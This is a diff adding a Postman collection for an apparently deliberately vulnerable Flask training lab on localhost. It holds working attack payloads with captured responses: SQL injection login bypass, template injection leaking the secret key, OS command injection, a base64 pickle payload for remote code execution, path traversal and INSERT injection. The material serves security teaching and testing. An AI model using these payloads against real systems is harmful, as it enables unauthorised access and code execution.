@@ -1,0 +1,615 @@
+{
+  "info": {
+    "_postman_id": "51847cc2-875c-4acb-8ca2-2074ec73ffd4",
+    "name": "S-SDLC Lab (Spicy)",
+    "description": "Aplicação Flask deliberadamente insegura, utilizada como parte da avaliação **Playground de Segurança DevSecOps.**\n\nEssa colelction possui os payloads maliciosos.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "_exporter_id": "46120368"
+  },
+  "item": [
+    {
+      "name": "Index / Health Check",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{host}}",
+          "host": [
+            "{{host}}"
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "Hello World",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{host}}",
+              "host": [
+                "{{host}}"
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "Text",
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "75"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:24:16 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"message\": \"Bem-vindo à Aplicação Vulnerável\",\n    \"status\": \"ok\"\n}"
+        }
+      ]
+    },
+    {
+      "name": "Login (SQLi — Bypass de Autenticação)",
+      "request": {
+        "auth": {
+          "type": "noauth"
+        },
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "urlencoded",
+          "urlencoded": [
+            {
+              "key": "username",
+              "value": "' OR '1'='1' --",
+              "type": "text",
+              "uuid": "0db51b8d-cd6f-4e44-9deb-099992e8ef56"
+            },
+            {
+              "key": "password",
+              "value": "pwned",
+              "type": "text",
+              "uuid": "a26c31ed-420d-4252-ad69-c7e90ae597e9"
+            }
+          ]
+        },
+        "url": {
+          "raw": "{{host}}/login",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "login"
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "Bem vindo, admin",
+          "originalRequest": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "' OR '1'='1' --",
+                  "type": "text",
+                  "uuid": "0db51b8d-cd6f-4e44-9deb-099992e8ef56"
+                },
+                {
+                  "key": "password",
+                  "value": "pwned",
+                  "type": "text",
+                  "uuid": "a26c31ed-420d-4252-ad69-c7e90ae597e9"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{host}}/login",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "login"
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "46"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:40:09 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"role\": \"admin\",\n    \"status\": \"success\"\n}"
+        }
+      ]
+    },
+    {
+      "name": "Buscar Usuário (SSTI — Server-Side Template Injection)",
+      "protocolProfileBehavior": {
+        "disableBodyPruning": true
+      },
+      "request": {
+        "auth": {
+          "type": "noauth"
+        },
+        "method": "GET",
+        "header": [],
+        "body": {
+          "mode": "urlencoded",
+          "urlencoded": [
+            {
+              "key": "username",
+              "value": "alice",
+              "type": "text",
+              "uuid": "0db51b8d-cd6f-4e44-9deb-099992e8ef56"
+            },
+            {
+              "key": "password",
+              "value": "alice123",
+              "type": "text",
+              "uuid": "a26c31ed-420d-4252-ad69-c7e90ae597e9"
+            }
+          ]
+        },
+        "url": {
+          "raw": "{{host}}/search?username=%7B%7Bconfig%7D%7D",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "search"
+          ],
+          "query": [
+            {
+              "key": "username",
+              "value": "%7B%7Bconfig%7D%7D"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "Who is config?",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "alice",
+                  "type": "text",
+                  "uuid": "0db51b8d-cd6f-4e44-9deb-099992e8ef56"
+                },
+                {
+                  "key": "password",
+                  "value": "alice123",
+                  "type": "text",
+                  "uuid": "a26c31ed-420d-4252-ad69-c7e90ae597e9"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{host}}/search?username=%7B%7Bconfig%7D%7D",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "search"
+              ],
+              "query": [
+                {
+                  "key": "username",
+                  "value": "%7B%7Bconfig%7D%7D"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "text/html; charset=utf-8"
+            },
+            {
+              "key": "Content-Length",
+              "value": "1380"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:40:27 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "    \n<html>\n    <body>\n        <h1>Resultados da Busca</h1>\n        <p>Resultados para: &lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;supersecretkey123&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: False, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;</p>\n        <p>Nenhum usuário encontrado.</p>\n    </body>\n</html>"
+        }
+      ]
+    },
+    {
+      "name": "Ping (Command Injection — OS Command Injection)",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{host}}/ping?host=127.0.0.1 %26 whoami",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "ping"
+          ],
+          "query": [
+            {
+              "key": "host",
+              "value": "127.0.0.1 & whoami",
+              "type": "text"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "whoami",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{host}}/ping?host=127.0.0.1 %26 whoami",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "ping"
+              ],
+              "query": [
+                {
+                  "key": "host",
+                  "value": "127.0.0.1 %26 whoami"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "369"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:41:04 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"output\": \"\\nDisparando 127.0.0.1 com 32 bytes de dados:\\nResposta de 127.0.0.1: bytes=32 tempo<1ms TTL=128\\n\\nEstat¡sticas do Ping para 127.0.0.1:\\n    Pacotes: Enviados = 1, Recebidos = 1, Perdidos = 0 (0% de\\n             perda),\\nAproximar um n£mero redondo de vezes em milissegundos:\\n    M¡nimo = 0ms, M ximo = 0ms, M‚dia = 0ms\\nmeu-computador\\\\meu-usuario\\n\"\n}"
+        }
+      ]
+    },
+    {
+      "name": "Desserializa base64 (Insecure Deserialization — RCE via Pickle)",
+      "request": {
+        "auth": {
+          "type": "noauth"
+        },
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "urlencoded",
+          "urlencoded": [
+            {
+              "key": "data",
+              "value": "gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NtZCAvYyBlY2hvIFJDRSB2aWEgcGlja2xlID4gJVRFTVAlL3B3bmVkLnR4dCcpIG9yIF9faW1wb3J0X18oJ29zJykucGF0aC5leHBhbmR2YXJzKCdDaGVjayBDOi9Vc2Vycy8lVVNFUk5BTUUlL0FwcERhdGEvTG9jYWwvVGVtcC9wd25lZC50eHQnKZSFlFKULg==",
+              "type": "text",
+              "uuid": "6cbd9a3d-72ec-4361-9a49-6a9a5c151b28"
+            }
+          ]
+        },
+        "url": {
+          "raw": "{{host}}/deserialize",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "deserialize"
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "RCE",
+          "originalRequest": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "data",
+                  "value": "gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NtZCAvYyBlY2hvIFJDRSB2aWEgcGlja2xlID4gJVRFTVAlL3B3bmVkLnR4dCcpIG9yIF9faW1wb3J0X18oJ29zJykucGF0aC5leHBhbmR2YXJzKCdDaGVjayBDOi9Vc2Vycy8lVVNFUk5BTUUlL0FwcERhdGEvTG9jYWwvVGVtcC9wd25lZC50eHQnKZSFlFKULg==",
+                  "type": "text",
+                  "uuid": "6cbd9a3d-72ec-4361-9a49-6a9a5c151b28"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{host}}/deserialize",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "deserialize"
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": "Text",
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "68"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:26:24 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"result\": \"Check C:/Users/%USERNAME%/AppData/Local/Temp/pwned.txt\"\n}"
+        }
+      ]
+    },
+    {
+      "name": "Leitura de Arquivos (Path Traversal)",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "url": {
+          "raw": "{{host}}/file?name=../data/sast_results.json",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "file"
+          ],
+          "query": [
+            {
+              "key": "name",
+              "value": "../data/sast_results.json"
+            }
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "../data/sast_results.json",
+          "originalRequest": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{host}}/file?name=../data/sast_results.json",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "file"
+              ],
+              "query": [
+                {
+                  "key": "name",
+                  "value": "../data/sast_results.json"
+                }
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "8537"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:43:22 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"content\": \"{\\n  \\\"tool\\\": \\\"semgrep\\\",\\n  \\\"version\\\": \\\"1.45.0\\\",\\n  \\\"scan_date\\\": \\\"2024-11-15T10:30:00Z\\\",\\n  \\\"repository\\\": \\\"s-sdlc-lab\\\",\\n  \\\"results\\\": [\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.sqli.flask-sqli\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 74, \\\"col\\\": 14 },\\n      \\\"end\\\":   { \\\"line\\\": 74, \\\"col\\\": 80 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"ERROR\\\",\\n        \\\"message\\\": \\\"Detected possible SQL injection via string formatting. Use parameterised queries instead.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-89\\\"],\\n          \\\"owasp\\\": [\\\"A03:2021 - Injection\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"    query = f\\\\\\\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\\\\\\\"\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.sqli.flask-sqli\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 138, \\\"col\\\": 5 },\\n      \\\"end\\\":   { \\\"line\\\": 138, \\\"col\\\": 85 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"ERROR\\\",\\n        \\\"message\\\": \\\"Detected possible SQL injection via string formatting in INSERT statement.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-89\\\"],\\n          \\\"owasp\\\": [\\\"A03:2021 - Injection\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"        f\\\\\\\"INSERT INTO users (username, password) VALUES ('{username}', '{password}')\\\\\\\"\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.flask.security.xss.reflected-xss\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 92, \\\"col\\\": 17 },\\n      \\\"end\\\":   { \\\"line\\\": 98, \\\"col\\\": 6 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"WARNING\\\",\\n        \\\"message\\\": \\\"User-supplied data is rendered directly in an HTML template. This may allow reflected XSS.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-79\\\"],\\n          \\\"owasp\\\": [\\\"A03:2021 - Injection\\\"],\\n          \\\"confidence\\\": \\\"MEDIUM\\\"\\n        },\\n        \\\"lines\\\": \\\"    template = f\\\\\\\"\\\\\\\"\\\\\\\"\\\\n    <html>\\\\n      <body>\\\\n        <h1>Search Results</h1>\\\\n        <p>Results for: {username}</p>\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.subprocess-shell-true\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 112, \\\"col\\\": 14 },\\n      \\\"end\\\":   { \\\"line\\\": 112, \\\"col\\\": 75 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"ERROR\\\",\\n        \\\"message\\\": \\\"subprocess called with shell=True and user-controlled input. Possible OS command injection.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-78\\\"],\\n          \\\"owasp\\\": [\\\"A03:2021 - Injection\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"    result = subprocess.check_output(f\\\\\\\"ping -c 1 {host}\\\\\\\", shell=True, text=True)\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.pickle.pickle-deserialization\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 126, \\\"col\\\": 11 },\\n      \\\"end\\\":   { \\\"line\\\": 126, \\\"col\\\": 53 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"ERROR\\\",\\n        \\\"message\\\": \\\"Deserialization of untrusted data using pickle. Can lead to arbitrary code execution.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-502\\\"],\\n          \\\"owasp\\\": [\\\"A08:2021 - Software and Data Integrity Failures\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"    obj = pickle.loads(base64.b64decode(data))\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.hardcoded-password\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 31, \\\"col\\\": 1 },\\n      \\\"end\\\":   { \\\"line\\\": 31, \\\"col\\\": 34 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"WARNING\\\",\\n        \\\"message\\\": \\\"Hardcoded password detected in source code.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-798\\\"],\\n          \\\"owasp\\\": [\\\"A07:2021 - Identification and Authentication Failures\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"DB_PASSWORD = \\\\\\\"admin1234\\\\\\\"\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.hardcoded-token\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 32, \\\"col\\\": 1 },\\n      \\\"end\\\":   { \\\"line\\\": 32, \\\"col\\\": 60 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"WARNING\\\",\\n        \\\"message\\\": \\\"Possible hardcoded API token detected.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-798\\\"],\\n          \\\"owasp\\\": [\\\"A07:2021 - Identification and Authentication Failures\\\"],\\n          \\\"confidence\\\": \\\"MEDIUM\\\"\\n        },\\n        \\\"lines\\\": \\\"API_TOKEN = \\\\\\\"ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\\\\\\"\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.path-traversal\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 121, \\\"col\\\": 9 },\\n      \\\"end\\\":   { \\\"line\\\": 121, \\\"col\\\": 35 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"ERROR\\\",\\n        \\\"message\\\": \\\"File path constructed from user input without sanitisation. Possible path traversal.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-22\\\"],\\n          \\\"owasp\\\": [\\\"A01:2021 - Broken Access Control\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"    with open(filename, \\\\\\\"r\\\\\\\") as f:\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.security.audit.weak-crypto.use-of-md5\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 56, \\\"col\\\": 15 },\\n      \\\"end\\\":   { \\\"line\\\": 56, \\\"col\\\": 45 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"WARNING\\\",\\n        \\\"message\\\": \\\"Use of MD5 hashing which is cryptographically weak. Use bcrypt or argon2 for passwords.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-327\\\"],\\n          \\\"owasp\\\": [\\\"A02:2021 - Cryptographic Failures\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"    hashed = hashlib.md5(b\\\\\\\"password123\\\\\\\").hexdigest()\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.flask.debug-mode-enabled\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 36, \\\"col\\\": 1 },\\n      \\\"end\\\":   { \\\"line\\\": 36, \\\"col\\\": 30 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"INFO\\\",\\n        \\\"message\\\": \\\"Flask DEBUG mode is enabled. This should never be enabled in production as it exposes an interactive debugger.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-94\\\"],\\n          \\\"owasp\\\": [\\\"A05:2021 - Security Misconfiguration\\\"],\\n          \\\"confidence\\\": \\\"HIGH\\\"\\n        },\\n        \\\"lines\\\": \\\"app.config[\\\\\\\"DEBUG\\\\\\\"] = True\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.correctness.return-in-init\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 44, \\\"col\\\": 1 },\\n      \\\"end\\\":   { \\\"line\\\": 44, \\\"col\\\": 30 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"INFO\\\",\\n        \\\"message\\\": \\\"Function get_db_connection does not close the connection explicitly in all code paths.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [],\\n          \\\"confidence\\\": \\\"LOW\\\"\\n        },\\n        \\\"lines\\\": \\\"def get_db_connection():\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"generic.secrets.security.detected-generic-secret\\\",\\n      \\\"path\\\": \\\"ci-cd/pipeline.yml\\\",\\n      \\\"start\\\": { \\\"line\\\": 22, \\\"col\\\": 7 },\\n      \\\"end\\\":   { \\\"line\\\": 22, \\\"col\\\": 45 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"WARNING\\\",\\n        \\\"message\\\": \\\"A secret value appears to be hardcoded in the CI/CD pipeline configuration.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [\\\"CWE-798\\\"],\\n          \\\"owasp\\\": [\\\"A07:2021 - Identification and Authentication Failures\\\"],\\n          \\\"confidence\\\": \\\"MEDIUM\\\"\\n        },\\n        \\\"lines\\\": \\\"      SNYK_TOKEN: \\\\\\\"hardcoded-snyk-token-abc123\\\\\\\"\\\"\\n      }\\n    },\\n    {\\n      \\\"check_id\\\": \\\"python.lang.correctness.comments.fixme\\\",\\n      \\\"path\\\": \\\"app/app.py\\\",\\n      \\\"start\\\": { \\\"line\\\": 100, \\\"col\\\": 1 },\\n      \\\"end\\\":   { \\\"line\\\": 100, \\\"col\\\": 20 },\\n      \\\"extra\\\": {\\n        \\\"severity\\\": \\\"INFO\\\",\\n        \\\"message\\\": \\\"FIXME comment found in source code. Resolve before merging.\\\",\\n        \\\"metadata\\\": {\\n          \\\"cwe\\\": [],\\n          \\\"confidence\\\": \\\"LOW\\\"\\n        },\\n        \\\"lines\\\": \\\"    # FIXME: handle errors\\\"\\n      }\\n    }\\n  ],\\n  \\\"stats\\\": {\\n    \\\"total\\\": 13,\\n    \\\"by_severity\\\": {\\n      \\\"ERROR\\\": 5,\\n      \\\"WARNING\\\": 5,\\n      \\\"INFO\\\": 3\\n    }\\n  }\\n}\\n\"\n}"
+        }
+      ]
+    },
+    {
+      "name": "Registrar Usuário (SQLi — Injeção em INSERT / Multi-Row)",
+      "request": {
+        "method": "POST",
+        "header": [],
+        "body": {
+          "mode": "urlencoded",
+          "urlencoded": [
+            {
+              "key": "username",
+              "value": "hacker",
+              "type": "text",
+              "uuid": "baa4f057-fcac-42d8-b2d6-1409aceda451"
+            },
+            {
+              "key": "password",
+              "value": "pwned'), ('hacker2', 'pwned",
+              "type": "text",
+              "uuid": "d97c60ba-b80a-42a8-87ca-b1b7c9da89d7"
+            }
+          ]
+        },
+        "url": {
+          "raw": "{{host}}/register",
+          "host": [
+            "{{host}}"
+          ],
+          "path": [
+            "register"
+          ]
+        }
+      },
+      "response": [
+        {
+          "name": "status: injetado",
+          "originalRequest": {
+            "method": "POST",
+            "header": [],
+            "body": {
+              "mode": "urlencoded",
+              "urlencoded": [
+                {
+                  "key": "username",
+                  "value": "hacker",
+                  "type": "text",
+                  "uuid": "baa4f057-fcac-42d8-b2d6-1409aceda451"
+                },
+                {
+                  "key": "password",
+                  "value": "pwned'), ('hacker2', 'pwned",
+                  "type": "text",
+                  "uuid": "d97c60ba-b80a-42a8-87ca-b1b7c9da89d7"
+                }
+              ]
+            },
+            "url": {
+              "raw": "{{host}}/register",
+              "host": [
+                "{{host}}"
+              ],
+              "path": [
+                "register"
+              ]
+            }
+          },
+          "status": "OK",
+          "code": 200,
+          "_postman_previewlanguage": null,
+          "header": [
+            {
+              "key": "Content-Type",
+              "value": "application/json"
+            },
+            {
+              "key": "Content-Length",
+              "value": "29"
+            },
+            {
+              "key": "Server",
+              "value": "Werkzeug/2.0.1 Python/3.12.10"
+            },
+            {
+              "key": "Date",
+              "value": "Wed, 01 Jul 2026 01:43:54 GMT"
+            }
+          ],
+          "cookie": [],
+          "body": "{\n    \"status\": \"registrado\"\n}"
+        }
+      ]
+    }
+  ],
+  "event": [
+    {
+      "listen": "prerequest",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "requests": {},
+        "exec": [
+          ""
+        ]
+      }
+    },
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "packages": {},
+        "requests": {},
+        "exec": [
+          ""
+        ]
+      }
+    }
+  ],
+  "variable": [
+    {
+      "key": "host",
+      "value": "http://localhost:5000"
+    },
+    {
+      "key": "user",
+      "value": "alice"
+    },
+    {
+      "key": "pwd",
+      "value": "alice123"
+    }
+  ]
+}
